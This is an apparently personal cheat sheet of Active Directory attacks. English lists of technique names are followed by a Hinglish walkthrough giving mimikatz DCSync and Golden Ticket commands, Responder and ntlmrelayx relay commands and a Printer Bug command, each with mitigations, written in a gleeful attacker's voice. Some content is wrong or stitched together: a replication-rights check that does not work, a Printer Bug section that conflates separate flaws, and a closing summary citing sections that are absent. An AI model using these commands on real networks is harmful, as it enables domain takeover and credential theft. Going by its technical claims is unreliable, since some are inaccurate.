# ad-info

# Active Directory: Full Attack Name

### 1️⃣ **Initial Access** 🚪

These attacks focus on gaining initial entry into the network.

1. **Phishing Attack** – Sending a malicious email to a user that executes malware or a payload.
2. **Malicious Attachments / Macros** – Injecting macro-based payloads into Word/Excel files.
3. **Credential Stuffing** – Attempting logins using leaked passwords.
4. **Pass-the-Cookie Attack** – Hijacking a session by stealing web session cookies.
5. **Pass-the-Ticket Attack** – Reusing an active Kerberos ticket.
6. **Malicious USB / Rubber Ducky** – Infiltrating the network via physical access.
7. **Exposed SMB Shares** – Stealing confidential files from public SMB shares.
8. **VPN Credential Hijacking** – Capturing remote VPN login credentials.
9. **Zero-Day Exploitation** – Exploiting unpatched vulnerabilities (e.g., Log4Shell).
10. **LLMNR/NBT-NS Poisoning** – Stealing credentials by intercepting name resolution queries.
11. **Evil Twin Attack** – Capturing credentials from a fake Wi-Fi access point.
12. **Watering Hole Attack** – Targeting users by placing malware on trusted websites.
13. **Supply Chain Attack** – Infiltrating via third-party software or services.

---

### 2️⃣ **Credential Dumping Attacks** 🔑

These attacks aim to extract credentials from systems or memory.

1. **Mimikatz Attack** – Extracting plain text passwords and hashes from LSASS memory.
2. **DCSync Attack** – Obtaining NTLM hashes directly from a domain controller.
3. **LSASS Dumping** – Extracting passwords by dumping the LSASS process.
4. **SAM & SYSTEM Hive Dumping** – Obtaining local password hashes.
5. **Kerberos Ticket Extraction** – Capturing active Kerberos tickets (TGT/TGS).
6. **NTDS.dit Dumping** – Extracting all user credentials from the domain controller database.
7. **WDigest Credential Theft** – Obtaining plain text passwords from Windows memory.
8. **LSASS Memory Injection** – Stealing credentials by injecting malicious code into LSASS.
9. **Cached Credentials Dumping** – Extracting and cracking stored mscache credentials.
10. **Browser Credential Theft** – Stealing passwords and cookies stored in browsers.
11. **DPAPI Attack** – Decrypting encrypted data by abusing the Data Protection API.

---

### 3️⃣ **Privilege Escalation Attacks** 🚀

These attacks escalate privileges to gain higher access levels.

1. **Kerberoasting** – Extracting user passwords by cracking Kerberos service ticket hashes.
2. **AS-REP Roasting** – Brute-forcing Kerberos AS-REP responses.
3. **Token Impersonation Attack** – Stealing the security token of a high-privilege user.
4. **Pass-the-Hash Attack** – Bypassing authentication with NTLM hashes.
5. **Print Spooler Exploit** – Gaining SYSTEM access from the Print Spooler service.
6. **Unconstrained Delegation Abuse** – Stealing NTLM hashes of unconstrained delegation users.
7. **Constrained Delegation Abuse** – Abusing the Kerberos delegation feature.
8. **Local Privilege Escalation** – Gaining admin privileges from system vulnerabilities (CVEs).
9. **SeBackupPrivilege Abuse** – Abusing privileges to copy sensitive files.
10. **SeRestorePrivilege Abuse** – Abusing privileges to modify registry or files.
11. **Kerberos S4U2Self Abuse** – Abusing the S4U2Self protocol to create tickets.
12. **Kerberos S4U2Proxy Abuse** – Abusing S4U2Proxy for unauthorized access.
13. **DNSAdmins Group Abuse** – Having DNSAdmins members load malicious DLLs.
14. **AD Certificate Services Attack** – Abusing AD Certificate Services to issue unauthorized certificates.

---

### 4️⃣ **Lateral Movement** ↔︎️

These attacks help spread within the network after initial access.

1. **Pass-the-Hash** – Lateral movement from a compromised machine to another.
2. **Pass-the-Ticket** – Accessing machines by reusing Kerberos TGTs.
3. **SMB Relay Attack** – Exploiting SMB and LDAP services by relaying NTLM.
4. **PSExec Attack** – Executing commands with SYSTEM access on remote machines.
5. **RDP Hijacking** – Hijacking active RDP sessions without credentials.
6. **WMI Lateral Movement** – Remote system control via Windows Management Instrumentation.
7. **BloodHound Enumeration** – Finding high-privilege users and attack paths in AD.
8. **DCOM Lateral Movement** – Remote code execution via DCOM.
9. **WinRM Lateral Movement** – Running remote commands via Windows Remote Management.
10. **Printer Bug** – Lateral movement via printer service vulnerabilities.
11. **PetitPotam** – Compromising domain controllers with NTLM relay attacks.
12. **Domain Trust Attacks** – Abusing inter-domain trust relationships.
13. **Forest Trust Attacks** – Exploiting inter-forest trust relationships.

---

### 5️⃣ **Persistence & Domain Takeover** 🔒

These attacks ensure long-term access or full control of the domain.

1. **Golden Ticket Attack** – Domain takeover by creating unlimited Kerberos TGTs.
2. **Silver Ticket Attack** – Gaining access by creating Kerberos TGS for specific services.
3. **Skeleton Key Attack** – Injecting a universal password on domain controllers.
4. **AdminSDHolder Abuse** – Modifying permissions of protected accounts.
5. **GPO Hijacking** – Deploying malicious Group Policy Objects.
6. **SID History Injection** – Escalating privileges by creating fake SID history.
7. **Shadow Credentials Attack** – Gaining unauthorized access by abusing Key Trust authentication.
8. **RBCD Attack** – Exploiting AD’s delegation mechanisms.
9. **DCShadow Attack** – Making arbitrary changes by abusing domain controller replication rights.
10. **WMI Event Subscription** – Setting up persistent backdoors with WMI events.
11. **Registry Run Keys** – Running malicious programs at startup by modifying the registry.
12. **AD Recycle Bin Exploitation** – Restoring deleted objects for backdoor access.
13. **AD FS Token Forgery** – Creating fake tokens by stealing ADFS token signing certificates.
14. **Azure AD Connect Exploitation** – Accessing hybrid environments by compromising sync accounts.

---

### 6️⃣ **NTLM & Kerberos Exploitation** 🔐

These attacks target NTLM and Kerberos authentication protocols.

1. **NTLM Relay Attack** – Gaining unauthorized access by relaying NTLM authentication requests.
2. **NTLMv1 Downgrade Attack** – Brute-forcing by downgrading NTLM authentication.
3. **Kerberos Downgrade Attack** – Downgrading Kerberos to weaker encryption modes.
4. **Kerberos Overpass-the-Hash** – Bypassing authentication without Kerberos tickets.
5. **Brute-Force Kerberos Pre-Auth** – Attacking pre-auth disabled users.
6. **PAC Tampering Attack** – Modifying Kerberos PAC.
7. **TGT Delegation Abuse** – Using Kerberos delegation to use another user’s ticket.
8. **Kerberos Bronze Bit Attack** – Bypassing PAC validation for unauthorized access.
9. **LDAP Relay Attack** – Gaining unauthorized access by relaying LDAP authentication requests.

---

### 8️⃣ **Miscellaneous AD Attacks** 🛠️

These are additional techniques that don’t fit into other categories.

1. **AD Reconnaissance with PowerView** – Detailed enumeration of the AD environment with PowerView.
2. **AD Object Permission Abuse** – Abusing excessive permissions for unauthorized changes.
3. **Kerberos Unconstrained Delegation Abuse** – Capturing TGTs from unconstrained delegation.

```
### **2️⃣ 🏴‍☠️ Domain Replication Attack (DCSync Attack)**

✅ **Kya Hai?**

* **DCSync attack** ka use **attacker Domain Controller se directly NTLM hashes extract karne ke liye karta hai.**
* Yeh attack **domain admin privilege se directly krbtgt hash nikal ke full persistence maintain karne me kaam aata hai.**

✅ **Kaise Exploit Kare?** 📌 **Check karo ki kaunse users ke paas replication rights hain:**

`Get-ADUser -Filter * -Properties "Replicating Directory Changes"`

📌 **Agar attacker ne DA ya high-privileged user access le liya, toh DCSync execute karega:**

`mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt`

🔥 **Boom! Yeh command directly krbtgt ka NTLM hash de degi, jisse Golden Ticket attack possible hai.**

✅ **Mitigation:**

* **Domain Controllers ke replication permissions sirf trusted users ko do.**
* **Event ID 4662 aur 4742 monitor karo kyunki yeh DCSync detection me help karta hai.**
* **krbtgt ka password regular interval pe rotate karo.**

***

### **3️⃣ 🏴‍☠️ Printer Bug Attack (MS-RPRN Exploit)**

✅ **Kya Hai?**

* **Windows Print Spooler Service** ka **Remote Procedure Call (RPC)** feature **low-privileged users ko SYSTEM privilege lene** ka option deta hai.
* Yeh **Windows ka ek legacy bug hai jo ab tak kayi variations me exploit ho chuka hai (PrintNightmare, MS-RPRN, CVE-2021-1675, CVE-2021-34527)**.

✅ **Kaise Exploit Kare?** 📌 **Check karo ki target machine pe Print Spooler enabled hai ya nahi:**

`sc qc Spooler`

📌 **MS-RPRN exploit execute karo aur target machine pe arbitrary DLL load kar do:**

`Invoke-PrinterBug -ComputerName "victim-PC"`

🔥 **Agar successful hua, toh attacker SYSTEM privilege me commands execute kar sakta hai!**

✅ **Mitigation:**

* **Agar Print Spooler service ki zaroorat nahi hai toh isko disable kar do:**

`Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled`

* **Domain Controllers pe Print Spooler always disable hona chahiye!**

***

### **4️⃣ 🏴‍☠️ NTLM Relay Attack (No Password Required!)**

✅ **Kya Hai?**

* **NTLM authentication ka ek bada flaw yeh hai ki attacker kisi user ka challenge-response capture karke bina password ke authentication forward kar sakta hai.**
* Yeh attack **SMB, LDAP aur HTTP services me work karta hai.**

✅ **Kaise Exploit Kare?** 📌 **First, Responder ko set karo aur NTLM hashes capture karo:**

`responder -I eth0 -wrf`

📌 **Ab NTLM hash ko SMB relay kar do:**

`ntlmrelayx.py -tf target.txt -smb2support`

🔥 **Agar target vulnerable hai, toh attacker bina credentials ke SMB share access kar sakta hai!**

✅ **Mitigation:**

* **SMB Signing enable karo taaki NTLM relay block ho.**
* **LDAP Signing aur Channel Binding enforce karo.**
* **Domain users ko unnecessary admin rights na do.**

***

### **5️⃣ 🏴‍☠️ Golden Ticket Attack (Permanent Domain Persistence)**

✅ **Kya Hai?**

* **Golden Ticket attack me attacker krbtgt account ka hash leke unlimited Kerberos tickets bana sakta hai.**
* Iska matlab **attacker ko domain me permanent persistence mil jata hai, chahe wo user delete ho jaye ya password change ho jaye!** 😈

✅ **Kaise Exploit Kare?** 📌 **DCSync se krbtgt ka NTLM hash extract karo (Pehle wale attack me bata chuka hoon):**

`mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt`

📌 **Ab Golden Ticket generate karo:**

`mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt`

🔥 **Boom! Attacker ne ek "forever-valid" ticket create kar diya jo full domain access de sakta hai.**

✅ **Mitigation:**

* **krbtgt ka password har 90 days me rotate karo.**
* **SIEM me Event ID 4769 aur 4672 monitor karo jo unusual Kerberos activity detect karta hai.**
* **Strong Kerberos policies implement karo.**

***

### **🔥 Final Thoughts**

😈 **Agar tu real-world AD exploitation seekh raha hai, toh yeh advanced techniques kaafi important hain.**\
✅ **DCSync aur Golden Ticket attacks domain-wide persistence ke liye dangerous hain.**\
✅ **NTLM relay aur Printer Bug attacks low-privileged user ko SYSTEM access de sakte hain.**\
✅ **RBCD aur Shadow Credentials ka abuse kaafi stealthy aur powerful privilege escalation techniques hain.**
```